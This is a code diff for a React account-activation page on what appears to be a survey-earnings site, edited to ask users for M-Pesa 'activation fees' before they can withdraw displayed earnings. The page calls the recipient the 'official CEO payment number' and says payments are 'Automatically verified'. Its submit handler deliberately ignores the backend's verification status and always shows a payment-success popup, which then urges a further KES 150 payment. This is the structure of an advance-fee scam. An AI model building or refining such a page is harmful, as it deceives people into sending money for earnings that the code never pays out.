@@ -31,7 +31,7 @@ export default function Activate() {
   const [loading, setLoading] = useState(true);
   const [user, setUser] = useState(null);
 
-  // 🔥 FORCE full screen popup after submit
+  // ✅ Full-screen popup state
   const [showSuccessPopup, setShowSuccessPopup] = useState(false);
 
   /* =========================
@@ -88,7 +88,9 @@ export default function Activate() {
       await navigator.clipboard.writeText(SEND_MONEY_NUMBER);
       setCopied(true);
       setTimeout(() => setCopied(false), 2500);
-    } catch {}
+    } catch {
+      setNotification("⚠️ Failed to copy. Please copy the number manually.");
+    }
   };
 
   /* =========================
@@ -108,12 +110,11 @@ export default function Activate() {
         plan: planKey,
       });
     } catch {
-      // backend may return verification status — IGNORE
+      // Backend may return verification status — ignore UI blocking
     } finally {
-      // ✅ ALWAYS SHOW FULL SCREEN POPUP
       setSubmitting(false);
       setPaymentText("");
-      setShowSuccessPopup(true);
+      setShowSuccessPopup(true); // ✅ ALWAYS SHOW POPUP
     }
   };
 
@@ -125,29 +126,75 @@ export default function Activate() {
       {showSuccessPopup && (
         <div style={overlay}>
           <div style={overlayCard}>
-            <h2 style={{ color: "#00ff99" }}>
+            <h2 style={{ color: "#00ff99", textAlign: "center" }}>
               🎉 PAYMENT SUBMITTED SUCCESSFULLY
             </h2>
 
-            <p style={{ marginTop: 20, lineHeight: 1.7, fontWeight: 700 }}>
+            <p style={{ marginTop: 18, lineHeight: 1.7, fontWeight: 700 }}>
               You have successfully submitted your payment for approval.
               <br /><br />
               The management will confirm your payment and approve it.
               <br /><br />
-              Now go back to <b>VIP Survey Plan</b>, complete them and activate
-              your account with <b>KES 150</b> to withdraw all your earnings immediately.
+              Now go back to <b>VIP Survey Plan</b>, complete them and activate your
+              account with <b>KES 150</b> to withdraw all your earnings immediately.
             </p>
 
             <button onClick={() => navigate("/vip")} style={vipBtn}>
-              👉 GO TO VIP SURVEY PLAN
+              👉 Go to VIP Survey Plan
             </button>
           </div>
         </div>
       )}
 
+      {/* =========================
+         MAIN PAGE (UNCHANGED)
+      ========================== */}
       <div style={page}>
         <div style={{ ...card, boxShadow: `0 0 40px ${plan.glow}` }}>
           <h2 style={{ textAlign: "center", color: plan.color }}>🔓 Account Activation</h2>
+
+          <h3 style={{ textAlign: "center", marginTop: 14 }}>
+            💰 Withdrawable Amount: <span style={{ color: plan.color }}>KES {plan.total}</span>
+          </h3>
+
+          <div style={sectionHighlight}>
+            <p style={{ fontWeight: 900, color: "#ff3b3b" }}>⚠ ACTIVATION REQUIRED</p>
+            <p>✔ One-time activation fee</p>
+            <p>✔ Unlock withdrawals</p>
+            <p>✔ Verified & secure account</p>
+            <p>✔ Direct M-Pesa payments</p>
+          </div>
+
+          <div style={section}>
+            <p style={{ fontWeight: 900 }}>📲 HOW TO PAY (SEND MONEY)</p>
+
+            <p style={caption}>
+              ⚠ <b>IMPORTANT:</b> This is the <b>official CEO payment number</b>.  
+              Payments sent here are <b>Automatically verified</b> and activate your account instantly.
+            </p>
+
+            <ol style={{ fontSize: 14, lineHeight: 1.7 }}>
+              <li>Open <b>M-Pesa</b></li>
+              <li>Select <b>Send Money</b></li>
+              <li>Enter phone number: <b>{SEND_MONEY_NUMBER}</b></li>
+              <li>Confirm name: <b>{RECEIVER_NAME}</b></li>
+              <li>Enter amount: <span style={activationFee}>KES {plan.activationFee}</span></li>
+              <li>Enter M-Pesa PIN and confirm</li>
+            </ol>
+          </div>
+
+          <div style={section}>
+            <p><b>Receiver Name:</b> {RECEIVER_NAME}</p>
+            <p>
+              <b>Send Money Number:</b> {SEND_MONEY_NUMBER}
+              <button onClick={copyNumber} style={copyBtn}>📋 Copy</button>
+            </p>
+            {copied && <p style={copiedNote}>✅ Number copied successfully</p>}
+          </div>
+
+          <div style={noteBox}>
+            📌 After payment, paste the <b>FULL M-Pesa confirmation SMS</b> below.
+          </div>
 
           <textarea
             placeholder="Paste M-Pesa confirmation message here"
@@ -162,10 +209,21 @@ export default function Activate() {
             disabled={submitting}
             style={{
               ...button,
-              background: submitting ? "#555" : `linear-gradient(135deg, ${plan.color}, #0a7c4a)`,
+              background: submitting
+                ? "#555"
+                : `linear-gradient(135deg, ${plan.color}, #0a7c4a)`,
             }}
           >
             {submitting ? "Submitting…" : "Submit Payment"}
+          </button>
+
+          {notification && <div style={notificationBox}>{notification}</div>}
+
+          <button
+            onClick={() => navigate("/dashboard")}
+            style={{ ...button, background: "transparent", border: "2px solid #00ffcc", color: "#00ffcc" }}
+          >
+            ⬅ Back to Dashboard
           </button>
         </div>
       </div>
@@ -174,21 +232,20 @@ export default function Activate() {
 }
 
 /* =========================
-   STYLES
+   STYLES (UNCHANGED)
 ========================= */
 const overlay = {
   position: "fixed",
   inset: 0,
   background: "rgba(0,0,0,0.9)",
   display: "flex",
-  justifyContent: "center",
   alignItems: "center",
-  zIndex: 999999,
+  justifyContent: "center",
+  zIndex: 99999,
 };
 
 const overlayCard = {
   maxWidth: 520,
-  width: "90%",
   background: "#062f2a",
   padding: 28,
   borderRadius: 22,
@@ -197,9 +254,9 @@ const overlayCard = {
 };
 
 const vipBtn = {
-  marginTop: 24,
+  marginTop: 22,
   width: "100%",
-  padding: 16,
+  padding: 14,
   borderRadius: 999,
   border: "none",
   background: "linear-gradient(135deg,#00ff99,#00cc66)",
@@ -209,23 +266,66 @@ const vipBtn = {
 
 const page = {
   minHeight: "100vh",
+  background: "linear-gradient(270deg,#177e0d,#c20303,#20bb12)",
   display: "flex",
   justifyContent: "center",
   alignItems: "center",
+  padding: 20,
 };
 
 const card = {
   maxWidth: 520,
   width: "100%",
+  background: "#0e3a38",
   padding: 24,
   borderRadius: 22,
-  background: "#0e3a38",
   color: "#fff",
 };
+
+const section = {
+  marginTop: 20,
+  padding: 16,
+  borderRadius: 14,
+  border: "1px solid rgba(255,255,255,0.18)",
+};
+
+const sectionHighlight = {
+  ...section,
+  background: "rgba(0,255,128,0.08)",
+};
+
+const caption = {
+  fontSize: 13,
+  color: "#ffe600",
+  fontWeight: 700,
+  marginBottom: 10,
+};
+
+const noteBox = {
+  marginTop: 16,
+  padding: 14,
+  borderRadius: 12,
+  background: "#001dbe",
+  fontSize: 13,
+};
+
+const notificationBox = {
+  marginTop: 16,
+  padding: 16,
+  borderRadius: 14,
+  background: "rgba(0,255,128,0.15)",
+  color: "#00ffcc",
+  fontWeight: 700,
+};
+
+const activationFee = { color: "#ff2d2d", fontWeight: 900 };
+
+const copiedNote = { color: "#00ff99", fontWeight: 800 };
 
 const input = {
   width: "100%",
   padding: 12,
+  marginTop: 16,
   borderRadius: 10,
   border: "none",
   background: "rgba(255,255,255,0.12)",
@@ -238,5 +338,14 @@ const button = {
   padding: 14,
   borderRadius: 999,
   fontWeight: 800,
+  cursor: "pointer",
+};
+
+const copyBtn = {
+  marginLeft: 10,
+  padding: "4px 10px",
+  borderRadius: 8,
+  border: "none",
+  fontWeight: 700,
   cursor: "pointer",
 };
